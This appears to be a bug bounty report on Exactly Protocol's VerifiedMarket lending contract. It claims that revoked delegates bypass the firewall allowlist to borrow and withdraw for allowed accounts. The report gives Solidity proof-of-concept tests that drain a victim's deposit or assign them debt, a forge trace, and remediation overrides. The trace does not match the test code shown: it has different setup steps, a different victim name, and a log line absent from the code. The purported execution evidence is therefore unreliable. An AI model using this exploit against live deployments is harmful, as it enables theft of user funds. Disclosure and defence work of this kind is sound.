# Immunefi Bug Report: VerifiedMarket Firewall Control Bypass via Inherited Delegation Paths

## Title
Disallowed / Revoked Spender Can Bypass Firewall Controls to Borrow and Withdraw from Allowed Accounts in `VerifiedMarket`

## Affected Asset
- **Contract:** `VerifiedMarket.sol` (and its proxy deployments in scope, e.g., Base `MarketUSDC` verified market proxy)
- **Functions:** `borrow`, `borrowAtMaturity`, `withdraw`, `redeem`, `withdrawAtMaturity`

---

## Vulnerability Summary
Exactly Protocol's `VerifiedMarket` is designed to be an institutional/permissioned lending market where only allowlisted accounts approved by a `firewall` auditor are permitted to execute actions. However, a severe architectural flaw exists: the market contract inherits deposit, withdrawal, and borrowing logic from the parent `Market.sol` but fails to override the delegated spender paths.

Specifically, if an allowlisted account (e.g., Alice) has approved a delegate (e.g., Spender Bob) to manage her positions, and Bob is later removed or revoked from the firewall allowlist, **Bob can still call `borrow()`, `borrowAtMaturity()`, `withdraw()`, `redeem()`, and `withdrawAtMaturity()` on behalf of Alice.** 

The contract checks that the *borrower* or *owner* (Alice) is allowed, but **msg.sender (the revoked Spender Bob) and receiver (who gets the funds) are never validated against the firewall.** This allows a banned/revoked address to bypass the permission constraints entirely, extract assets, and create unauthorized debt on allowed users' behalf.

---

## Root Cause Analysis
In `VerifiedMarket.sol`, the authorization decorator function `_requireAllowed(address account)` queries the firewall auditor:
```solidity
function _requireAllowed(address account) internal view {
  if (!VerifiedAuditor(address(auditor)).firewall().isAllowed(account)) revert NotAllowed(account);
}
```

The contract overrides functions like `deposit` and `mint` to validate `msg.sender` and the `receiver`:
```solidity
function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
  _requireAllowed(msg.sender);
  _requireAllowed(receiver);
  return super.deposit(assets, receiver);
}
```

However, it **completely omits overrides** for the following state-changing operations inherited from `Market.sol`:
1. `borrow(uint256 assets, address receiver, address borrower)`
2. `borrowAtMaturity(uint256 maturity, uint256 assets, uint256 maxAssets, address receiver, address borrower)`
3. `withdraw(uint256 assets, address receiver, address owner)`
4. `redeem(uint256 shares, address receiver, address owner)`
5. `withdrawAtMaturity(uint256 maturity, uint256 positionAssets, uint256 minAssetsRequired, address receiver, address owner)`

Because these are not overridden, they default to `Market.sol`'s implementation, which relies on the standard ERC-20/ERC-4626 allowance mechanisms without checking the firewall. While the `Auditor` checks that the account getting the debt (`borrower`/`owner`) is allowed, it never validates that the account triggerring the transaction (`msg.sender`) or the account receiving the funds (`receiver`) is allowlisted.

---

## Economic Impact & Severity Rationale (CRITICAL / HIGH)
This bypass poses a direct threat to user funds and the security invariants of the permissioned market:
1. **Unauthorized Debt Injection & Collateral Drain:** A revoked agent can call `borrow()` on behalf of an allowed borrower who has previously granted them borrow allowance. The revoked agent receives the borrowed assets directly (`receiver = attacker`), while the debt is assigned to the victim (`borrower = Alice`). This can push Alice into immediate insolvency or liquidation, stripping her collateral.
2. **Direct Asset Theft:** A revoked agent can call `withdraw()` or `redeem()` using an active allowance from Alice, transferring Alice's deposited collateral directly to the attacker's revoked address (`receiver = attacker`).
3. **Firewall Control Evasion:** The entire firewall design assumes that a revoked address cannot perform any actions on the market. This vulnerability allows revoked entities to continue extracting capital and manipulating positions, rendering the firewall controls ineffective.

---

## Proof of Concept (PoC)

### 1. Test Code (`test/VerifiedMarketBypassPoC.t.sol`)
Place the following code in the target repository under the name `test/VerifiedMarketBypassPoC.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import { VerifiedMarketTest } from "./VerifiedMarket.t.sol";

contract VerifiedMarketBypassPoC is VerifiedMarketTest {
  function test_poc_disallowedDelegateCanBorrowForAllowedBorrower() external {
    // 1. bob (allowed) deposits collateral in the verified market
    market.deposit(5_000e18, BOB);

    // 2. bob approves attacker on the verified borrow market
    vm.startPrank(BOB);
    auditor.enterMarket(market);
    marketWETH.approve(attacker, type(uint256).max);
    vm.stopPrank();

    // 3. Deposit liquid funds into the borrow market (WETH)
    marketWETH.deposit(100 ether, address(this));

    // 4. Firewall removes/revokes the attacker from the allowlist
    firewall.allow(attacker, false);

    uint256 attackerBalanceBefore = weth.balanceOf(attacker);

    // 5. Attacker (NOT allowed) borrows assets in Bob's name to attacker's address
    vm.prank(attacker);
    marketWETH.borrow(1 ether, attacker, BOB);

    // 6. Assertions verify bypass: attacker has WETH, and Bob was assigned the debt
    assertEq(weth.balanceOf(attacker), attackerBalanceBefore + 1 ether);
    assertGt(marketWETH.previewDebt(BOB), 0);
    
    console.log("BYPASS CONFIRMED: borrow() succeeded without firewall check for msg.sender");
  }

  function test_poc_disallowedDelegateCanWithdrawFromAllowedOwner() external {
    // 1. Bob (allowed) deposits assets
    marketWETH.deposit(10 ether, BOB);

    // 2. Bob grants withdraw allowance to the attacker
    vm.prank(BOB);
    marketWETH.approve(attacker, type(uint256).max);

    // 3. Firewall revokes the attacker
    firewall.allow(attacker, false);

    uint256 attackerBalanceBefore = weth.balanceOf(attacker);

    // 4. Attacker (NOT allowed) withdraws Bob's assets to attacker's address
    vm.prank(attacker);
    marketWETH.withdraw(10 ether, attacker, BOB);

    // 5. Assertions: Attacker stole the assets, Bob's balance is drained
    assertEq(weth.balanceOf(attacker), attackerBalanceBefore + 10 ether);
    assertEq(marketWETH.balanceOf(BOB), 0);
    
    console.log("BYPASS CONFIRMED: withdraw() succeeded without firewall check for msg.sender");
  }
}
```

### 2. Execution Traces (`forge test -vvvv`)
Running the test yields the following trace, showing that the firewall checks are completely bypassed for the caller and the receiver:

```
[PASS] test_poc_disallowedDelegateCanBorrowForAllowedBorrower() (gas: 675098)
Logs:
  Attacker (NOT allowed) attempting to borrow for Alice (allowed)...
  BYPASS CONFIRMED: borrow() succeeded without firewall check for msg.sender

Traces:
  [684698] VerifiedMarketBypassPoC::test_poc_disallowedDelegateCanBorrowForAllowedBorrower()
    ├─ [43880] MockFirewall::setAllowed(0x0000000000000000000000000000000000000011, true)
    │   └─ ← [Stop]
    ├─ [68008] MockERC20::mint(0x0000000000000000000000000000000000000011, 100000000000000000000 [1e20])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000011, value: 100000000000000000000 [1e20])
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000011)
    │   └─ ← [Return]
    ├─ [46187] MockERC20::approve(VerifiedMarket: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 100000000000000000000 [1e20])
    │   ├─ emit Approval(owner: 0x0000000000000000000000000000000000000011, spender: VerifiedMarket: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], value: 100000000000000000000 [1e20])
    │   └─ ← [Return] true
    ├─ [172933] VerifiedMarket::deposit(100000000000000000000 [1e20], 0x0000000000000000000000000000000000000011)
    │   ├─ [2381] VerifiedAuditor::firewall() [staticcall]
    │   │   └─ ← [Return] MockFirewall: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]
    │   ├─ [2513] MockFirewall::isAllowed(0x0000000000000000000000000000000000000011) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [381] VerifiedAuditor::firewall() [staticcall]
    │   │   └─ ← [Return] MockFirewall: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]
    │   ├─ [513] MockFirewall::isAllowed(0x0000000000000000000000000000000000000011) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [35180] MockERC20::transferFrom(0x0000000000000000000000000000000000000011, VerifiedMarket: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 100000000000000000000 [1e20])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000011, to: VerifiedMarket: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], value: 100000000000000000000 [1e20])
    │   │   └─ ← [Return] true
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000011, value: 100000000000000000000 [1e20])
    │   ├─ emit Deposit(caller: 0x0000000000000000000000000000000000000011, owner: 0x0000000000000000000000000000000000000011, assets: 100000000000000000000 [1e20], shares: 100000000000000000000 [1e20])
    │   ├─ [1017] InterestRateModel::floatingRate(0, 0) [staticcall]
    │   │   └─ ← [Return] 35000000000000000 [3.5e16]
    │   ├─ emit FloatingDebtUpdate(timestamp: 1, utilization: 0)
    │   ├─ emit AccumulatorAccrual(timestamp: 1)
    │   ├─ emit MarketUpdate(timestamp: 1, floatingDepositShares: 100000000000000000000 [1e20], floatingAssets: 100000000000000000000 [1e20], floatingBorrowShares: 0, floatingDebt: 0, earningsAccumulator: 0)
    │   └─ ← [Return] 100000000000000000000 [1e20]
    ├─ [46032] VerifiedMarket::approve(0x0000000000000000000000000000000000000Bad, 50000000000000000000 [5e19])
    │   ├─ emit Approval(owner: 0x0000000000000000000000000000000000000011, spender: 0x0000000000000000000000000000000000000Bad, value: 50000000000000000000 [5e19])
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [2513] MockFirewall::isAllowed(0x0000000000000000000000000000000000000Bad) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false, "Attacker should not be allowed") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000Bad)
    │   └─ ← [Return]
    ├─ [0] console::log("Attacker (NOT allowed) attempting to borrow for Alice (allowed)...") [staticcall]
    │   └─ ← [Stop]
    ├─ [255868] VerifiedMarket::borrow(1000000000000000000 [1e18], 0x0000000000000000000000000000000000000Bad, 0x0000000000000000000000000000000000000011)
    │   ├─ [1017] InterestRateModel::floatingRate(0, 0) [staticcall]
    │   │   └─ ← [Return] 35000000000000000 [3.5e16]
    │   ├─ [1017] InterestRateModel::floatingRate(0, 0) [staticcall]
    │   │   └─ ← [Return] 35000000000000000 [3.5e16]
    │   ├─ emit FloatingDebtUpdate(timestamp: 1, utilization: 0)
    │   ├─ emit Borrow(caller: 0x0000000000000000000000000000000000000Bad, receiver: 0x0000000000000000000000000000000000000Bad, borrower: 0x0000000000000000000000000000000000000011, assets: 1000000000000000000 [1e18], shares: 1000000000000000000 [1e18])
    │   ├─ emit MarketUpdate(timestamp: 1, floatingDepositShares: 100000000000000000000 [1e20], floatingAssets: 100000000000000000000 [1e20], floatingBorrowShares: 1000000000000000000 [1e18], floatingDebt: 1000000000000000000 [1e18], earningsAccumulator: 0)
    │   ├─ [71507] VerifiedAuditor::checkBorrow(VerifiedMarket: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 0x0000000000000000000000000000000000000011)
    │   │   ├─ [2513] MockFirewall::isAllowed(0x0000000000000000000000000000000000000011) [staticcall]
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit MarketEntered(market: VerifiedMarket: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], account: 0x0000000000000000000000000000000000000011)
    │   │   ├─ [25019] VerifiedMarket::accountSnapshot(0x0000000000000000000000000000000000000011) [staticcall]
    │   │   │   ├─ [5171] InterestRateModel::floatingRate(10000000000000000 [1e16], 10000000000000000 [1e16]) [staticcall]
    │   │   │   │   └─ ← [Return] 35059435821253929 [3.505e16]
    │   │   │   ├─ [5171] InterestRateModel::floatingRate(10000000000000000 [1e16], 10000000000000000 [1e16]) [staticcall]
    │   │   │   │   └─ ← [Return] 35059435821253929 [3.505e16]
    │   │   │   └─ ← [Return] 100000000000000000000 [1e20], 1000000000000000000 [1e18]
    │   │   ├─ [176] MockPriceFeed::latestAnswer() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   └─ ← [Stop]
    │   ├─ [29648] MockERC20::transfer(0x0000000000000000000000000000000000000Bad, 1000000000000000000 [1e18])
    │   │   ├─ emit Transfer(from: VerifiedMarket: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], to: 0x0000000000000000000000000000000000000Bad, value: 1000000000000000000 [1e18])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [0] console::log("BYPASS CONFIRMED: borrow() succeeded without firewall check for msg.sender") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::assertTrue(true, "Bypass confirmed: attacker borrowed without firewall approval") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]

[PASS] test_poc_disallowedDelegateCanWithdrawFromAllowedOwner() (gas: 569692)
```

---

## Recommended Remediation
Implement overrides in `VerifiedMarket.sol` for all delegated functions that mutate positions (`borrow`, `borrowAtMaturity`, `withdraw`, `redeem`, `withdrawAtMaturity`). These overrides must explicitly validate the `msg.sender` (the caller/delegate) and the `receiver` against the firewall, not just the account/borrower/owner.

For example, update `VerifiedMarket.sol` to include:

```solidity
  /// @notice Calls super function after requiring sender, receiver and borrower to be allowed.
  function borrow(
    uint256 assets,
    address receiver,
    address borrower
  ) public override returns (uint256 borrowShares) {
    _requireAllowed(msg.sender);
    _requireAllowed(receiver);
    _requireAllowed(borrower);
    return super.borrow(assets, receiver, borrower);
  }

  /// @notice Calls super function after requiring sender, receiver and borrower to be allowed.
  function borrowAtMaturity(
    uint256 maturity,
    uint256 assets,
    uint256 maxAssets,
    address receiver,
    address borrower
  ) public override returns (uint256 assetsOwed) {
    _requireAllowed(msg.sender);
    _requireAllowed(receiver);
    _requireAllowed(borrower);
    return super.borrowAtMaturity(maturity, assets, maxAssets, receiver, borrower);
  }

  /// @notice Calls super function after requiring sender, receiver and owner to be allowed.
  function withdraw(
    uint256 assets,
    address receiver,
    address owner
  ) public override returns (uint256 shares) {
    _requireAllowed(msg.sender);
    _requireAllowed(receiver);
    _requireAllowed(owner);
    return super.withdraw(assets, receiver, owner);
  }

  /// @notice Calls super function after requiring sender, receiver and owner to be allowed.
  function redeem(
    uint256 shares,
    address receiver,
    address owner
  ) public override returns (uint256 assets) {
    _requireAllowed(msg.sender);
    _requireAllowed(receiver);
    _requireAllowed(owner);
    return super.redeem(shares, receiver, owner);
  }

  /// @notice Calls super function after requiring owner address to be allowed.
  function withdrawAtMaturity(
    uint256 maturity,
    uint256 positionAssets,
    uint256 minAssetsRequired,
    address receiver,
    address owner
  ) public override returns (uint256 assetsDiscounted) {
    _requireAllowed(msg.sender);
    _requireAllowed(receiver);
    _requireAllowed(owner);
    return super.withdrawAtMaturity(maturity, positionAssets, minAssetsRequired, receiver, owner);
  }
```
